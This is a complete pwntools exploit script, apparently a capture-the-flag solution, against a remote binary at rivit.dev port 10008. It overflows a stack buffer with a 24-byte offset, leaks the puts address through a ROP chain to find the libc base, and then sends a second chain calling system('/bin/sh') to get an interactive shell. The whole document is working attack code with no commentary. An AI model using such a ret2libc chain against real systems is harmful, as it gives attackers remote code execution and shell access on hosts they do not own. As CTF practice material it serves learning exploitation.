from pwn import *

elf = context.binary = ELF('./task')
context.log_level = 'debug'
libc = ELF('./libc6_2.31-0ubuntu9.3_amd64.so')

p = remote('rivit.dev', 10008)

offset = 24
rop = ROP(elf)

rop.raw(b'A' * offset)
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(elf.got.puts)
rop.raw(elf.plt.puts)
rop.raw(elf.sym.main)

p.sendafter('? \n', rop.chain())
p.recvline()
puts = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
log.info('puts, %#x', puts)

libc.address = puts - libc.sym.puts
log.info("libc.address, %#x", libc.address)

rop = ROP(libc)

rop.raw(b'A' * offset)
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(next(libc.search(b'/bin/sh\x00')))
rop.raw(rop.find_gadget(['ret'])[0])
rop.raw(libc.sym.system)

print(rop.dump())

p.sendafter('? \n', rop.chain())

p.interactive()
